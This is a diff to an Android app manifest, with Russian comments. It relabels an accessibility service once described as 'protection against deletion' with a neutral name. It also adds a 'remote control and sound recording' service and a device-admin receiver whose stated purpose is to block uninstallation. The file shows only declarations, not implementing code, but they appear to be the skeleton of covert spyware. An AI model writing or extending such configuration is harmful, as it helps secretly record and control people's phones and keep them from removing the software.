@@ -26,7 +26,7 @@
             </intent-filter>
         </activity>
 
-        <!-- Сервис защиты от удаления -->
+        <!-- Сервис доступности -->
         <service
             android:name=".CoreService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
@@ -38,6 +38,24 @@
                 android:name="android.accessibilityservice"
                 android:resource="@xml/accessibility_service_config" />
         </service>
+
+        <!-- Сервис удаленного контроля и записи звука -->
+        <service
+            android:name=".RemoteControlService"
+            android:exported="false" />
+
+        <!-- Ресивер администратора устройства (для блокировки удаления) -->
+        <receiver
+            android:name=".MyDeviceAdminReceiver"
+            android:permission="android.permission.BIND_DEVICE_ADMIN"
+            android:exported="true">
+            <meta-data
+                android:name="android.app.device_admin"
+                android:resource="@xml/device_admin" />
+            <intent-filter>
+                <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
+            </intent-filter>
+        </receiver>
 
     </application>
 </manifest>
